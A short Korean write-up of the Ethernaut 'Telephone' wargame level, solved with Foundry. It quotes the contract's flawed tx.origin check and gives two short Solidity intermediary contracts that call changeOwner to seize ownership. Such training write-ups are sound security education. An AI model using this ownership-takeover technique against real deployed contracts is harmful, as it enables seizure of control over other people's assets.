# Ethernaut Foundry로 풀기

## 04.Telephone

```
    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
```

문제에서 여기를 보면 tx.origin이랑 msg.sender랑 달라야한다.
그러면 컨트랙트를 통해서 changeOwner를 실행해주면 된다.

그런데 다른 풀이를 보니까 script에서 컨트랙트를 하나 만들어서 constructor안에서 한번에 해결하던데
나는 그게 조금은 어색해서 두번에 걸쳐서 진행했다.

이건 내 풀이

```
    Telephone tele ;
    constructor(Telephone _tele){
           tele =  _tele;
    }
    function go() public {
        tele.changeOwner(0xBD008DB3d8704Ce124fcd13E448E950B409e07E1);
    }
```

이건 [참조](https://medium.com/@JohnnyTime/ethernaut-4-telephone-foundry-solution-2023-tutorial-f2e06f229f27) 풀이

```
contract IntermidiaryContract {
    constructor(Telephone _telephone, address _newOwner) {
        _telephone.changeOwner(_newOwner);
    }
}
```
